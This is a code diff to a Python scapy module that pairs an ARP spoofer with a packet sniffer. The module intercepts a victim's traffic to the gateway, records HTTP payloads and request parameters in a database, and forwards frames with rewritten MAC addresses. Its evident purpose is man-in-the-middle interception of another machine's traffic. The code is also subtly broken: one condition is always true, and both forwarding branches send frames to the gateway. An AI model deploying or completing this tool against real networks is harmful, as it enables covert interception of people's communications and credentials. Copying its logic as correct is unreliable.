@@ -1,42 +1,69 @@
 from scapy.all import *
+from scapy.layers.dns import DNS
 from scapy.layers.inet import IP, TCP
 from threading import Lock
+
+from scapy.layers.l2 import Ether, getmacbyip
+
 from arpspoofer import ArpSpoofer
 from database import DataBase
+
+
+def is_https(pack):
+    return TCP in pack and (pack[TCP].sport == 443 or pack[TCP].dport == 443)
+
+
+def is_http(pack):
+    return TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)
 
 
 class Sniffer:
 
     def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
         self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
-        self.db_router = DataBase()
-        self.db_victim = DataBase()
-        self.packets = 0
+        self.db = DataBase()
+        self.packets = self.db.get_last()
         self.packets_lock = Lock()
 
     def start_spoofing(self):
         self.spoofer.start()
 
     def all_filter(self,packet):
-        return IP in packet and Raw in packet and TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443
+        #return IP in packet and Raw in packet and ((TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443) or (UDP in packet and packet[UDP].dport != 443 and packet[UDP].sport != 443) or (UDP not in packet and TCP not in packet))
+        return IP in packet and (DNS in packet or (TCP in packet and (packet[TCP].sport == 80 or packet[TCP].dport == 80) or (UDP in packet and (packet[UDP].sport == 80 or packet[UDP].dport == 80))))
 
     def sniff_all(self):
         sniff(prn=self.navigate_packets)
 
-    def navigate_packets(self, packet):
-        if self.all_filter(packet):
-            if packet[IP].src == self.spoofer.targetIP:
-                self.handle_packets_from_victim(packet)
-            elif packet[IP].dst == self.spoofer.targetIP:
-                self.handle_packets_from_router(packet)
-        else:
-            self.send_packet(packet)
+    def navigate_packets(self, pack: packet):
+        if self.all_filter(pack):
+            if self.is_from_victim(pack):
+                self.handle_packets_from_victim(pack)
+            elif self.is_from_router(pack):
+                self.handle_packets_from_router(pack)
 
-                #packet.show()
+
+    def is_from_router(self, pack):
+        return pack[IP].dst == self.spoofer.targetIP and pack[Ether].src == getmacbyip(self.spoofer.gatewayIP)
+
+    def is_from_victim(self,pack):
+        return pack[IP].src == self.spoofer.targetIP and pack[Ether].dst == self.spoofer.sourceMAC.replace("-",":").lower()
 
     def send_packet(self, packet):
-        
-        send(packet)
+        if Ether in packet and IP in packet:
+            if self.is_from_victim(packet):
+                # is from victim to router
+                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
+                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
+                #TODO: add changes
+            elif self.is_from_router(packet):
+                # if from router to victim
+                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
+                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
+                # TODO: add changes
+            else:
+                return
+            sendp(packet)
 
     def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
         if src_ip != None:
@@ -77,21 +104,35 @@ class Sniffer:
         " ".join(list)
         packet[Raw].load = list
 
+    def handle_https(self, pack):
+        pass
+        # TODO: handle this
 
-    def handle_packets_from_victim(self,packet):
+    def handle_dns(self, pack):
+        pass
+        # TODO: handle this
+
+    def handle_packets_from_victim(self, pack):
         print("start h/p/v")
-        self.db_victim = DataBase()
+        if is_http(pack):
+            #self.db = DataBase()
         #try:
-        self.db_victim.write_to_victim(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
-                                self.find_req_param(packet), packet[Raw].load, packet[TCP].sport, packet[TCP].dport)
+            self.db.write_to_victim(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
+                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
+            with self.packets_lock:
+                self.packets += 1
+        elif is_https:
+            self.handle_https(pack)
+        elif DNS in pack:
+            self.handle_dns(pack)
+
         #except TypeError:
             #print(TypeError)
             #packet.show()
 
         # fetchall returns list of tupples
         #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
-        with self.packets_lock:
-            self.packets += 1
+
         #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
          #             "src_port": None, "dst_port": None, "ttl": None}
         #for key in param_dict:
@@ -103,17 +144,22 @@ class Sniffer:
           #               param_dict["ttl"])
         #self.db.write_to_victim_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
          #                               packet[TCP].sport, packet[TCP].dport)
-        self.send_packet(packet)
+        self.send_packet(pack)
 
-    def handle_packets_from_router(self, packet):
+    def handle_packets_from_router(self, pack):
         print("h/p/r")
-        self.db_router = DataBase()
-        self.db_router.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
-                                    self.find_req_param(packet), packet[Raw].load,packet[TCP].sport, packet[TCP].dport)
-        # fetchall returns list of tupples
-        #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
-        with self.packets_lock:
-            self.packets += 1
+        if is_http(pack):
+            #self.db = DataBase()
+            self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
+                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
+            # fetchall returns list of tupples
+            #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
+            with self.packets_lock:
+                self.packets += 1
+        elif is_https:
+            self.handle_https(pack)
+        elif DNS in pack:
+            self.handle_dns(pack)
         #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
         #              "src_port": None, "dst_port": None, "ttl": None}
         #for key in param_dict:
@@ -125,4 +171,4 @@ class Sniffer:
         #                 param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
         #self.db.write_to_router_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
         #                                packet[TCP].sport, packet[TCP].dport)
-        self.send_packet(packet)
+        self.send_packet(pack)
